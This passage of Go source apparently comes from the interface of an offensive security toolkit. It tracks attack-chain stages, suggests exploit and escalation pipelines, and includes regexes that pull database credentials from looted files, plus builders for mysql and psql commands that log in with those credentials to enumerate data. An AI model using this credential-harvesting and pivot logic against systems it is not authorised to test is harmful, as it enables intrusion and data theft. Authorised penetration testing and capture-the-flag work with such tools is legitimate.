		{Zone: "EXT", ZoneLabel: "EXTERNAL SURFACE", Sub: "INTEL", SubLabel: "ROUTE DISCOVERY", Description: "Discovered endpoint intelligence and route expansion."},
		{Zone: "IDA", ZoneLabel: "IDENTITY & ACCESS", Sub: "AUTH", SubLabel: "AUTH ABUSE", Description: "Credential/session boundary and auth pivot surface."},
		{Zone: "IDA", ZoneLabel: "IDENTITY & ACCESS", Sub: "ACCESS", SubLabel: "PRIV PIVOT", Description: "API/database access lanes and privilege traversal."},
		{Zone: "DIM", ZoneLabel: "DATA & IMPACT", Sub: "EXFIL", SubLabel: "DATA EXPOSURE", Description: "Data extraction lanes from records, files, and collections."},
		{Zone: "DIM", ZoneLabel: "DATA & IMPACT", Sub: "TAMPER", SubLabel: "INTEGRITY IMPACT", Description: "Integrity impact, write-path tamper, and objective actions."},
	}
}

func (m model) selectedSkullMapNode() exploitSkullMapNode {
	nodes := exploitSkullMapNodes()
	if len(nodes) == 0 {
		return exploitSkullMapNode{
			Zone: "EXT", ZoneLabel: "EXTERNAL SURFACE",
			Sub: "SURFACE", SubLabel: "RECON/FINGERPRINT",
		}
	}
	idx := clampWrap(m.archMapTaxIdx, len(nodes))
	return nodes[idx]
}

func exploitSkullSubForNode(node attackGraphNode) string {
	meta := strings.ToLower(strings.TrimSpace(node.ID + " " + node.Kind + " " + node.Label + " " + node.Detail + " " + node.Ref))
	switch {
	case strings.Contains(meta, "impact"), strings.Contains(meta, "objective"), strings.Contains(meta, "tamper"), strings.Contains(meta, "write"):
		return "TAMPER"
	case node.Kind == "collection", node.Kind == "record", strings.Contains(meta, "file lane"), strings.Contains(meta, "artifact"), strings.Contains(meta, "backup"), strings.Contains(meta, "exfil"), strings.Contains(meta, "dump"), strings.Contains(meta, "download"):
		return "EXFIL"
	case strings.Contains(meta, "auth"):
		return "AUTH"
	case strings.Contains(meta, "api lane"), strings.Contains(meta, "db lane"), strings.HasPrefix(strings.ToLower(strings.TrimSpace(node.ID)), "api-endpoint-"), strings.Contains(meta, "collection"), strings.Contains(meta, "record"):
		return "ACCESS"
	case node.Kind == "endpoint", strings.Contains(meta, "intel"):
		return "INTEL"
	default:
		return "SURFACE"
	}
}

func filterExploitGraphBySkullNode(nodes []attackGraphNode, selected exploitSkullMapNode) []attackGraphNode {
	if len(nodes) == 0 || strings.TrimSpace(selected.Sub) == "" {
		return nodes
	}
	parentByID := map[string]string{}
	for _, node := range nodes {
		parentByID[node.ID] = strings.TrimSpace(node.Parent)
	}
	keep := map[string]bool{}
	for _, node := range nodes {
		if !strings.EqualFold(exploitSkullSubForNode(node), selected.Sub) {
			continue
		}
		keep[node.ID] = true
		parent := strings.TrimSpace(node.Parent)
		for parent != "" {
			if keep[parent] {
				break
			}
			keep[parent] = true
			parent = strings.TrimSpace(parentByID[parent])
		}
	}
	if len(keep) == 0 {
		for _, node := range nodes {
			if strings.TrimSpace(node.Parent) == "" {
				return []attackGraphNode{node}
			}
		}
		return nodes
	}
	filtered := make([]attackGraphNode, 0, len(nodes))
	for _, node := range nodes {
		if keep[node.ID] {
			filtered = append(filtered, node)
		}
	}
	filtered = normalizeAttackGraphDepth(filtered)
	if len(filtered) == 0 {
		return nodes
	}
	return filtered
}

func normalizeAttackGraphDepth(nodes []attackGraphNode) []attackGraphNode {
	if len(nodes) == 0 {
		return nodes
	}
	indexByID := map[string]int{}
	for idx, node := range nodes {
		indexByID[node.ID] = idx
	}
	memo := map[string]int{}
	var depthFor func(id string, stack map[string]bool) int
	depthFor = func(id string, stack map[string]bool) int {
		if cached, ok := memo[id]; ok {
			return cached
		}
		idx, ok := indexByID[id]
		if !ok {
			return 0
		}
		parent := strings.TrimSpace(nodes[idx].Parent)
		if parent == "" {
			memo[id] = 0
			return 0
		}
		if stack[id] {
			return 0
		}
		stack[id] = true
		parentDepth := depthFor(parent, stack)
		delete(stack, id)
		depth := parentDepth + 1
		memo[id] = depth
		return depth
	}
	out := make([]attackGraphNode, 0, len(nodes))
	for _, node := range nodes {
		next := node
		next.Depth = depthFor(node.ID, map[string]bool{})
		out = append(out, next)
	}
	return out
}

func exploitSkullPwnState(nodes []attackGraphNode, commands []commandEntry, findings []findingEntry, loot []lootEntry) map[string]bool {
	state := map[string]bool{
		"SURFACE": false,
		"INTEL":   false,
		"AUTH":    false,
		"ACCESS":  false,
		"EXFIL":   false,
		"TAMPER":  false,
	}
	for _, node := range nodes {
		sub := exploitSkullSubForNode(node)
		if strings.TrimSpace(sub) == "" {
			continue
		}
		if node.Pwned {
			state[sub] = true
		}
	}
	snap := deriveChainSnapshot(commands, findings, loot)
	if snap.Recon {
		state["SURFACE"] = true
	}
	if snap.Breach {
		state["AUTH"] = true
	}
	if snap.Access {
		state["ACCESS"] = true
	}
	if snap.Exfil {
		state["EXFIL"] = true
	}
	if snap.Tamper {
		state["TAMPER"] = true
	}
	if hasLootMatch(loot, "/api/") || hasFindingMatch(findings, "endpoint") || hasFindingMatch(findings, "surface") {
		state["INTEL"] = true
	}
	return state
}

func skullPwnBadge(pwned bool) string {
	if pwned {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("PWN")
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("151")).Bold(true).Padding(0, 1).Render("OPEN")
}

func renderExploitSkullMapMenu(current exploitSkullMapNode, pwn map[string]bool, treeFocus bool, width int) string {
	nodes := exploitSkullMapNodes()
	lines := make([]string, 0, len(nodes))
	for _, node := range nodes {
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		if strings.EqualFold(node.Sub, current.Sub) {
			prefix = "▸ "
			if treeFocus {
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true)
			} else {
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
		}
		line := fmt.Sprintf("%s%s / %s %s", prefix, node.ZoneLabel, node.SubLabel, skullPwnBadge(pwn[node.Sub]))
		lines = append(lines, style.Render(line))
	}
	return wrap(strings.Join(lines, "\n"), width)
}

func renderExploitSkullASCII(current exploitSkullMapNode, pwn map[string]bool, treeFocus bool) string {
	lines := strings.Split(strings.TrimPrefix(skullTaxonomyASCII, "\n"), "\n")
	if len(lines) < 23 {
		return skullTaxonomyASCII
	}

	frontalPwn := pwn["SURFACE"] || pwn["INTEL"]
	midPwn := pwn["AUTH"] || pwn["ACCESS"]
	jawPwn := pwn["EXFIL"] || pwn["TAMPER"]

	lines[3] = replacePrefix(lines[3], 14, skullMainLabel("EXT SURFACE", 14, frontalPwn, strings.EqualFold(current.Zone, "EXT"), treeFocus))
	lines[4] = replacePrefix(lines[4], 14, strings.Repeat(" ", 14))
	lines[10] = replacePrefix(lines[10], 13, strings.Repeat(" ", 13))
	lines[11] = replacePrefix(lines[11], 13, skullMainLabel("ID+ACCESS", 13, midPwn, strings.EqualFold(current.Zone, "IDA"), treeFocus))
	lines[12] = replacePrefix(lines[12], 13, strings.Repeat(" ", 13))
	lines[13] = replacePrefix(lines[13], 13, strings.Repeat(" ", 13))
	lines[18] = replacePrefix(lines[18], 16, skullMainLabel("DATA/IMPACT", 16, jawPwn, strings.EqualFold(current.Zone, "DIM"), treeFocus))

	lines[3] = replaceAfterMarker(lines[3], ",--- ", skullSubLabel("RECON/FINGERPRINT", pwn["SURFACE"], strings.EqualFold(current.Sub, "SURFACE"), treeFocus))
	lines[7] = replaceAfterMarker(lines[7], "<----- ", skullSubLabel("ROUTE DISCOVERY", pwn["INTEL"], strings.EqualFold(current.Sub, "INTEL"), treeFocus))
	lines[10] = replaceAfterMarker(lines[10], "<------ ", skullSubLabel("AUTH ABUSE", pwn["AUTH"], strings.EqualFold(current.Sub, "AUTH"), treeFocus))
	lines[13] = replaceAfterMarker(lines[13], "<--------- ", skullSubLabel("PRIV PIVOT", pwn["ACCESS"], strings.EqualFold(current.Sub, "ACCESS"), treeFocus))
	lines[15] = replaceAfterMarker(lines[15], "<--- ", skullSubLabel("EXFIL", pwn["EXFIL"], strings.EqualFold(current.Sub, "EXFIL"), treeFocus))
	lines[20] = replaceAfterMarker(lines[20], "<-x---- ", skullSubLabel("INTEGRITY IMPACT", pwn["TAMPER"], strings.EqualFold(current.Sub, "TAMPER"), treeFocus))
	return strings.Join(lines, "\n")
}

func skullMainLabel(label string, width int, pwned bool, selected bool, treeFocus bool) string {
	text := fmt.Sprintf("%-*s", width, label)
	switch {
	case selected && !treeFocus:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true).Render(text)
	case selected && treeFocus:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true).Render(text)
	case pwned:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("160")).Bold(true).Render(text)
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Bold(true).Render(text)
	}
}

func skullSubLabel(label string, pwned bool, selected bool, treeFocus bool) string {
	switch {
	case selected && !treeFocus:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true).Render(label)
	case selected && treeFocus:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true).Render(label)
	case pwned:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("160")).Bold(true).Render(label)
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Bold(true).Render(label)
	}
}

func severityWeight(sev string) int {
	switch strings.ToLower(strings.TrimSpace(sev)) {
	case "critical":
		return 4
	case "high":
		return 3
	case "medium":
		return 2
	case "low":
		return 1
	default:
		return 0
	}
}

func nodeSeverity(findings []findingEntry) string {
	best := ""
	bestW := -1
	for _, f := range findings {
		w := severityWeight(f.Severity)
		if w > bestW {
			bestW = w
			best = f.Severity
		}
	}
	return best
}

func findingMatchesExploitNode(f findingEntry, node exploitTaxonomyNode) bool {
	macro, sub := exploitTaxonomySelection(f, nil, nil, nil)
	return strings.EqualFold(node.Macro, macro) && strings.EqualFold(node.Sub, sub)
}

func findingOrderByExploitNode(findings []findingEntry, node exploitTaxonomyNode) []int {
	order := make([]int, 0, len(findings))
	for idx, item := range findings {
		if findingMatchesExploitNode(item, node) {
			order = append(order, idx)
		}
	}
	return order
}

func (m *model) ensurePwnedSelection() {
	nodes := exploitTaxonomyNodes()
	if len(nodes) == 0 {
		m.pwnedTaxIdx = 0
		return
	}
	m.pwnedTaxIdx = clampWrap(m.pwnedTaxIdx, len(nodes))
	order := findingOrderByExploitNode(m.findings, m.selectedExploitTaxonomyNode())
	if len(order) == 0 {
		return
	}
	if indexInOrder(order, m.findingIdx) < 0 {
		m.findingIdx = order[0]
	}
}

func (m *model) movePwnedFinding(delta int) {
	order := findingOrderByExploitNode(m.findings, m.selectedExploitTaxonomyNode())
	if len(order) == 0 {
		return
	}
	pos := indexInOrder(order, m.findingIdx)
	if pos < 0 {
		pos = 0
	}
	pos = clamp(pos+delta, 0, len(order)-1)
	m.findingIdx = order[pos]
	m.findingDetailScroll = 0
}

func renderExploitTaxonomyMenu(current exploitTaxonomyNode, findings []findingEntry, width int) string {
	nodes := []string{
		"DISCOVER::SURFACE",
		"DISCOVER::INTEL",
		"BREACH::AUTH",
		"BREACH::ACCESS",
		"IMPACT::EXFIL",
		"IMPACT::TAMPER",
	}
	lines := make([]string, 0, len(nodes))
	selected := strings.ToUpper(strings.TrimSpace(current.Macro + "::" + current.Sub))
	for _, node := range nodes {
		parts := strings.SplitN(node, "::", 2)
		nodeObj := exploitTaxonomyNode{Macro: parts[0], Sub: parts[1]}
		nodeFindings := make([]findingEntry, 0, 4)
		for _, item := range findings {
			if findingMatchesExploitNode(item, nodeObj) {
				nodeFindings = append(nodeFindings, item)
			}
		}
		sev := strings.ToUpper(valueOr(nodeSeverity(nodeFindings), "none"))
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		if strings.EqualFold(node, selected) {
			prefix = "▸ "
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
		}
		lines = append(lines, style.Render(fmt.Sprintf("%s%s [%s]", prefix, node, sev)))
	}
	return wrap(strings.Join(lines, "\n"), width)
}

func taxonomyExplain(category, sub string) string {
	switch category + "::" + sub {
	case "INPUT::SEED_ENTITY":
		return "Feed the pipeline with entity seeds (name, username, email, phone) and context scope."
	case "INPUT::SEED_INFRA":
		return "Feed infrastructure seeds (domain, URL, IP, ASN) and baseline targeting context."
	case "DISCOVERY::ENTITY_EXPANSION":
		return "Expand linked identities and cross-platform traces from seed identities."
	case "DISCOVERY::INFRA_EXPANSION":
		return "Expand linked infrastructure via subdomains, passive intel and service pivots."
	case "COLLECTION::PASSIVE_PULL":
		return "Collect raw intelligence via passive lookups, APIs and module-based enrichment."
	case "COLLECTION::ACTIVE_PULL":
		return "Run deeper automation/crawling where scope and legal guardrails allow."
	case "PROCESSING::NORMALIZE":
		return "Normalize raw artifacts into consistent fields ready for correlation and replay."
	case "PROCESSING::DEDUPE":
		return "Deduplicate repeated entities/observations and keep highest-confidence records."
	case "ANALYSIS::CORRELATE":
		return "Connect entities into graphs/timelines to identify relationships and hypotheses."
	case "ANALYSIS::RISK_SCORE":
		return "Apply investigative prioritization and risk-scoring to focus operator effort."
	case "VALIDATION::CROSS_CHECK":
		return "Verify critical claims with independent sources and reproducible command evidence."
	case "VALIDATION::GAP_TRACK":
		return "Track missing evidence prerequisites before escalating to publication/reporting."
	case "REPORTING::INTEL_EXPORT":
		return "Export collected intelligence as reproducible evidence bundle for downstream analysis."
	case "REPORTING::ACTION_BRIEF":
		return "Prepare operator/journalist brief with findings, confidence, and next actions."
	default:
		return "OSINT phase bucket for mapping evidence to investigation workflow."
	}
}

func ternary(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}

func renderTips(tips []string, width int) string {
	if len(tips) == 0 {
		return "no immediate operator suggestion"
	}
	lines := make([]string, 0, len(tips))
	for i, tip := range tips {
		if i >= 4 {
			break
		}
		lines = append(lines, wrap(fmt.Sprintf("%d. %s", i+1, tip), width))
	}
	return strings.Join(lines, "\n")
}

func targetHostFromURL(targetURL string) string {
	parsed, err := url.Parse(strings.TrimSpace(targetURL))
	if err != nil || parsed.Hostname() == "" {
		return ""
	}
	return parsed.Hostname()
}

func nextTipsForFinding(f findingEntry, targetURL string) []string {
	base := strings.TrimSpace(targetURL)
	host := targetHostFromURL(base)
	if host == "" {
		host = "active target"
	}
	text := strings.ToLower(strings.TrimSpace(f.Title + " " + f.Evidence + " " + f.Impact + " " + f.Endpoint))
	containsAny := func(terms ...string) bool {
		for _, term := range terms {
			if strings.Contains(text, strings.ToLower(strings.TrimSpace(term))) {
				return true
			}
		}
		return false
	}
	switch {
	case containsAny("tool unavailable", "missing tool", "not found", "dependency"):
		return []string{
			"Run tool inventory/check wrappers before retrying this stage.",
			"Re-run same module after dependency health is green.",
			"Capture retry output to keep evidence reproducible.",
		}
	case containsAny("timeout", "timed out", "connection reset"):
		return []string{
			"Retry with increased timeout and narrowed execution scope.",
			"Run focused probe first, then escalate to full pipeline.",
			"Preserve partial outputs as intermediate evidence.",
		}
	case containsAny("auth", "login", "session", "jwt", "token", "credential"):
		return []string{
			"Validate auth boundary behavior with replayed requests.",
			"Run auth/API-focused pipeline to map privilege deltas.",
			"Pivot carefully and tag resulting artifacts by session identity.",
		}
	case containsAny("injection", "sql", "sqli", "rce", "command injection", "xss", "ssrf", "traversal"):
		return []string{
			"Confirm exploitability with controlled payload replay.",
			"Expand validation breadth to adjacent endpoints/parameters.",
			"Chain into exploit workflow only after deterministic reproduction.",
		}
	case containsAny("endpoint", "route", "path", "exposed", "disclosure", "listing", "artifact", "file"):
		return []string{
			"Probe exposed resource directly and record response differentials.",
			"Enumerate sibling resources in same exposure class.",
			"Promote high-signal responses into loot/action compartments.",
		}
	default:
		return []string{
			"Replay the triggering command and compare behavior over time.",
			"Advance to the next workflow compartment with highest missing coverage.",
			"Escalate only after reproducibility is confirmed on " + host + ".",
		}
	}
}

func normalizeFindingEndpoint(targetURL, endpoint string) string {
	base := strings.TrimSpace(targetURL)
	e := strings.TrimSpace(endpoint)
	if e == "" {
		return base
	}
	if strings.HasPrefix(strings.ToLower(e), "http://") || strings.HasPrefix(strings.ToLower(e), "https://") {
		return e
	}
	if base == "" {
		return e
	}
	if strings.HasPrefix(e, "/") {
		return strings.TrimRight(base, "/") + e
	}
	return strings.TrimRight(base, "/") + "/" + strings.TrimLeft(e, "/")
}

func findingContextSignals(f findingEntry, commands []commandEntry, findings []findingEntry, loot []lootEntry) map[string]bool {
	text := strings.ToLower(strings.TrimSpace(f.Title + " " + f.Evidence + " " + f.Impact + " " + f.Endpoint))
	has := func(terms ...string) bool {
		for _, term := range terms {
			if strings.Contains(text, strings.ToLower(strings.TrimSpace(term))) {
				return true
			}
		}
		return false
	}
	s := deriveChainSnapshot(commands, findings, loot)
	return map[string]bool{
		"tool_gap":      has("tool unavailable", "missing tool", "not found", "dependency"),
		"timeout":       has("timeout", "timed out", "connection reset"),
		"auth":          has("auth", "login", "session", "jwt", "token", "credential"),
		"injection":     has("injection", "sql", "sqli", "rce", "command injection", "cmd_injection", "xss", "ssrf", "traversal"),
		"exposure":      has("exposed", "disclosure", "listing", "backup", "sensitive", "artifact", "file"),
		"api":           has("api", "openapi", "/api/"),
		"service":       has("port", "service", "fingerprint", "banner"),
		"critical":      strings.EqualFold(strings.TrimSpace(f.Severity), "critical"),
		"high":          strings.EqualFold(strings.TrimSpace(f.Severity), "high"),
		"chain_recon":   s.Recon,
		"chain_breach":  s.Breach,
		"chain_access":  s.Access,
		"chain_exfil":   s.Exfil,
		"chain_tamper":  s.Tamper,
		"chain_privesc": s.PrivEsc,
	}
}

func findingFollowupAction(f findingEntry, targetURL string, commands []commandEntry, findings []findingEntry, loot []lootEntry) controlAction {
	base := strings.TrimSpace(targetURL)
	endpointURL := normalizeFindingEndpoint(base, f.Endpoint)
	if base == "" {
		return controlAction{
			Label:       "Follow-Up Blocked :: target required",
			Description: "Set active target URL from CTRL TARGET before running exploit follow-ups.",
			Mode:        "internal",
			Command:     "target:manual-url",
		}
	}
	signals := findingContextSignals(f, commands, findings, loot)
	buildPipeline := func(name, desc string) controlAction {
		return controlAction{
			Label:       "Fire Follow-Up :: " + name,
			Description: desc,
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + base + " --pipeline " + name,
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", base, "--pipeline", name},
		}
	}
	buildProbe := func(desc string) controlAction {
		return controlAction{
			Label:       "Fire Follow-Up :: endpoint probe",
			Description: desc,
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"curl -sS -i " + shellQuote(endpointURL) + "\"",
			KaliShell:   "curl -sS -i " + shellQuote(endpointURL),
		}
	}
	switch {
	case signals["tool_gap"]:
		return controlAction{
			Label:       "Fire Follow-Up :: tool inventory",
			Description: "Check callable tooling and rerun with resolved dependencies.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --list-tools",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--list-tools"},
		}
	case signals["timeout"]:
		return controlAction{
			Label:       "Fire Follow-Up :: timeout-retry",
			Description: "Retry with expanded timeout and narrowed scope.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + base + " --profile standard --timeout 180",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", base, "--profile", "standard", "--timeout", "180"},
		}
	case signals["critical"] || signals["high"]:
		if signals["injection"] {
			return buildPipeline("initial-exploit", "Critical exploit signal detected; execute exploit path confirmation.")
		}
		if signals["auth"] || signals["api"] {
			return buildPipeline("api-probe", "High-severity auth/API signal; validate privilege boundaries.")
		}
		if signals["exposure"] {
			return buildPipeline("web-enum", "High-severity exposure signal; enumerate sensitive paths/artifacts.")
		}
		return buildPipeline("vuln-sweep", "High-severity signal detected; broaden validation coverage.")
	case signals["service"] && !signals["chain_recon"]:
		return buildPipeline("surface-map", "Service-level signal found; complete recon compartment.")
	case signals["api"] && !signals["chain_breach"]:
		return buildPipeline("api-probe", "API signal found; drive breach-stage validation.")
	case signals["auth"] && !signals["chain_access"]:
		return buildPipeline("full-escalation", "Credential/auth signal found; execute escalation path.")
	case signals["injection"]:
		return buildPipeline("vuln-sweep", "Injection-class signal found; validate breadth and exploitability.")
	case signals["exposure"]:
		return buildProbe("Probe exposed endpoint/file path directly to confirm impact.")
	default:
		if !signals["chain_recon"] {
			return buildPipeline("surface-map", "Establish baseline recon and service map.")
		}
		if !signals["chain_breach"] {
			return buildPipeline("api-probe", "Probe auth/API surface for breach paths.")
		}
		if !signals["chain_access"] {
			return buildPipeline("initial-exploit", "Gain privileged resource/API access.")
		}
		if !signals["chain_exfil"] {
			return buildPipeline("web-enum", "Hunt collectible high-value artifacts.")
		}
		return buildPipeline("full-chain", "Run broad chain for additional signal.")
	}
}

func nextTipsForLoot(item lootEntry, targetURL string) []string {
	base := strings.TrimSpace(targetURL)
	host := targetHostFromURL(base)
	if host == "" {
		host = "active target"
	}
	kind := strings.ToLower(strings.TrimSpace(item.Kind))
	src := strings.ToLower(item.Source + " " + item.Name + " " + item.Preview)
	switch {
	case kind == "flag":
		return []string{
			"Snapshot telemetry now from CTRL history pane to preserve proof.",
			"Validate second objective paths (`/root/flag.txt`, `/home/*/flag.txt`) if host foothold exists.",
			"Document exploit chain in taxonomy for reproducible report.",
		}
	case kind == "credential" || kind == "token" || kind == "jwt":
		return []string{
			"Validate credential scope against target auth/API endpoints.",
			"Run `password-attacks` pipeline to test reuse across services on " + host + ".",
			"Follow with `post-enum` + `privesc` to assess privilege reach.",
		}
	case kind == "path" || kind == "endpoint":
		return []string{
			"Probe discovered path directly with `curl -sSI` and full GET body checks.",
			"Queue directory/API enumeration focused on the new path.",
			"Promote to finding if path yields auth bypass or sensitive data.",
		}
	case kind == "vuln":
		return []string{
			"Run `searchsploit` and `msfconsole` module search for this CVE.",
			"Confirm target version/path match before exploit attempts.",
			"Escalate to `initial-exploit` only after deterministic reproduction.",
		}
	case kind == "artifact" || strings.Contains(src, "artifacts/"):
		return []string{
			"Press `v` to inspect raw artifact content in-place.",
			"Correlate artifact signals with PWNED findings to prioritize next action.",
			"If artifact includes creds/tokens, pivot to `password-attacks` or `api-probe`.",
		}
	default:
		return []string{
			"Cross-check loot against endpoint map and taxonomy bucket.",
			"Replay originating command from OPS for confirmation.",
			"Use this as evidence in the next chain stage.",
		}
	}
}

func resolveLootSourcePath(root, source string) string {
	clean := strings.TrimSpace(source)
	if clean == "" {
		return ""
	}
	if filepath.IsAbs(clean) {
		if _, err := os.Stat(clean); err == nil {
			return clean
		}
		return ""
	}
	candidate := filepath.Join(root, filepath.FromSlash(clean))
	if _, err := os.Stat(candidate); err == nil {
		return candidate
	}
	return ""
}

func readLootSourceSnippet(path string, limit int) string {
	if strings.TrimSpace(path) == "" {
		return ""
	}
	if limit <= 0 {
		limit = 64 * 1024
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	if len(data) > limit {
		data = data[:limit]
	}
	return string(data)
}

func extractDBHints(item lootEntry, root string) []dbCredentialHint {
	sourcePath := resolveLootSourcePath(root, item.Source)
	content := strings.Join([]string{
		item.Kind,
		item.Name,
		item.Source,
		item.Preview,
		readLootSourceSnippet(sourcePath, 64*1024),
	}, "\n")
	lower := strings.ToLower(content)
	hints := []dbCredentialHint{}
	appendHint := func(h dbCredentialHint) {
		if strings.TrimSpace(h.Engine) == "" {
			return
		}
		if strings.TrimSpace(h.Host) == "" {
			target := strings.TrimSpace(loadState(filepath.Join(root, "telemetry", "state.json")).TargetURL)
			h.Host = strings.TrimSpace(targetHostFromURL(target))
		}
		if strings.TrimSpace(h.Host) == "" {
			return
		}
		switch strings.ToLower(h.Engine) {
		case "mysql":
			if strings.TrimSpace(h.Port) == "" {
				h.Port = "3306"
			}
			if strings.TrimSpace(h.User) == "" {
				h.User = "root"
			}
		case "postgres":
			if strings.TrimSpace(h.Port) == "" {
				h.Port = "5432"
			}
			if strings.TrimSpace(h.User) == "" {
				h.User = "postgres"
			}
			if strings.TrimSpace(h.Database) == "" {
				h.Database = "postgres"
			}
		}
		key := strings.ToLower(strings.TrimSpace(h.Engine + "|" + h.Host + "|" + h.Port + "|" + h.User + "|" + h.Database))
		for _, existing := range hints {
			existingKey := strings.ToLower(strings.TrimSpace(existing.Engine + "|" + existing.Host + "|" + existing.Port + "|" + existing.User + "|" + existing.Database))
			if key == existingKey {
				return
			}
		}
		hints = append(hints, h)
	}

	uriPatterns := []struct {
		engine string
		re     *regexp.Regexp
	}{
		{
			engine: "mysql",
			re:     regexp.MustCompile(`(?i)mysql://([^:\s/@]+)(?::([^@\s/]*))?@([^:\s/]+)(?::([0-9]{2,5}))?/([^?\s]+)`),
		},
		{
			engine: "postgres",
			re:     regexp.MustCompile(`(?i)postgres(?:ql)?://([^:\s/@]+)(?::([^@\s/]*))?@([^:\s/]+)(?::([0-9]{2,5}))?/([^?\s]+)`),
		},
	}
	for _, pattern := range uriPatterns {
		matches := pattern.re.FindAllStringSubmatch(content, 6)
		for _, m := range matches {
			appendHint(dbCredentialHint{
				Engine:   pattern.engine,
				User:     strings.TrimSpace(m[1]),
				Password: strings.TrimSpace(m[2]),
				Host:     strings.TrimSpace(m[3]),
				Port:     strings.TrimSpace(m[4]),
				Database: strings.TrimSpace(m[5]),
			})
		}
	}

	keyVal := map[string]string{}
	envPattern := regexp.MustCompile(`(?im)^\s*([a-z0-9_]+)\s*[:=]\s*["']?([^"'\r\n]+)["']?\s*$`)
	for _, m := range envPattern.FindAllStringSubmatch(content, -1) {
		key := strings.ToLower(strings.TrimSpace(m[1]))
		val := strings.TrimSpace(m[2])
		if key != "" && val != "" {
			keyVal[key] = val
		}
	}
	engine := ""
	switch {
	case strings.Contains(lower, "postgres"), strings.Contains(lower, "psql"), strings.Contains(lower, "db_port=5432"):
		engine = "postgres"
	case strings.Contains(lower, "mysql"), strings.Contains(lower, "mariadb"), strings.Contains(lower, "db_port=3306"):
		engine = "mysql"
	}
	if engine != "" {
		host := keyVal["db_host"]
		if host == "" {
			host = keyVal["mysql_host"]
		}
		if host == "" {
			host = keyVal["postgres_host"]
		}
		port := keyVal["db_port"]
		if port == "" {
			if engine == "mysql" {
				port = keyVal["mysql_port"]
			} else {
				port = keyVal["postgres_port"]
			}
		}
		user := keyVal["db_user"]
		if user == "" {
			user = keyVal["db_username"]
		}
		if user == "" {
			if engine == "mysql" {
				user = keyVal["mysql_user"]
			} else {
				user = keyVal["postgres_user"]
			}
		}
		pass := keyVal["db_password"]
		if pass == "" {
			pass = keyVal["db_pass"]
		}
		if pass == "" {
			if engine == "mysql" {
				pass = keyVal["mysql_password"]
			} else {
				pass = keyVal["postgres_password"]
			}
		}
		db := keyVal["db_name"]
		if db == "" {
			db = keyVal["database"]
		}
		if db == "" {
			if engine == "mysql" {
				db = keyVal["mysql_database"]
			} else {
				db = keyVal["postgres_db"]
			}
		}
		appendHint(dbCredentialHint{
			Engine:   engine,
			Host:     host,
			Port:     port,
			User:     user,
			Password: pass,
			Database: db,
		})
	}
	return hints
}

func mysqlPivotCommand(h dbCredentialHint) string {
	passArg := ""
	if strings.TrimSpace(h.Password) != "" {
		passArg = "-p" + shellQuote(h.Password)
	}
	query := "SHOW DATABASES;"
	if strings.TrimSpace(h.Database) != "" {
		query = query + " USE " + strings.TrimSpace(h.Database) + "; SHOW TABLES;"
	}
	parts := []string{
		"mysql",
		"-h", shellQuote(h.Host),
		"-P", shellQuote(h.Port),
		"-u", shellQuote(h.User),
	}
	if passArg != "" {
		parts = append(parts, passArg)
	}
	parts = append(parts, "-e", shellQuote(query))
	return strings.Join(parts, " ")
}

func mysqlSampleRowsCommand(h dbCredentialHint) string {
	passArg := ""
	if strings.TrimSpace(h.Password) != "" {
		passArg = "-p" + shellQuote(h.Password)
	}
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "information_schema"
	}
	query := "SELECT table_name FROM information_schema.tables WHERE table_schema='" + strings.ReplaceAll(db, "'", "") + "' LIMIT 5;"
	parts := []string{
		"mysql",
		"-h", shellQuote(h.Host),
		"-P", shellQuote(h.Port),
		"-u", shellQuote(h.User),
	}
	if passArg != "" {
		parts = append(parts, passArg)
	}
	parts = append(parts, "-e", shellQuote(query))
	return strings.Join(parts, " ")
}

func mysqlWriteProbeCommand(h dbCredentialHint) string {
	passArg := ""
	if strings.TrimSpace(h.Password) != "" {
		passArg = "-p" + shellQuote(h.Password)
	}
	parts := []string{
		"mysql",
		"-h", shellQuote(h.Host),
		"-P", shellQuote(h.Port),
		"-u", shellQuote(h.User),
	}
	if passArg != "" {
		parts = append(parts, passArg)
	}
	parts = append(parts, "-e", shellQuote("CREATE TEMPORARY TABLE jsbb_opsec_probe(id int); DROP TABLE jsbb_opsec_probe;"))
	return strings.Join(parts, " ")
}

func postgresPivotCommand(h dbCredentialHint) string {
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "postgres"
	}
	passPrefix := ""
	if strings.TrimSpace(h.Password) != "" {
		passPrefix = "PGPASSWORD=" + shellQuote(h.Password) + " "
	}
	return passPrefix + "psql -h " + shellQuote(h.Host) +
		" -p " + shellQuote(h.Port) +
		" -U " + shellQuote(h.User) +
		" -d " + shellQuote(db) +
		" -c '\\dt'"
}

func postgresSampleRowsCommand(h dbCredentialHint) string {
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "postgres"
	}
	passPrefix := ""
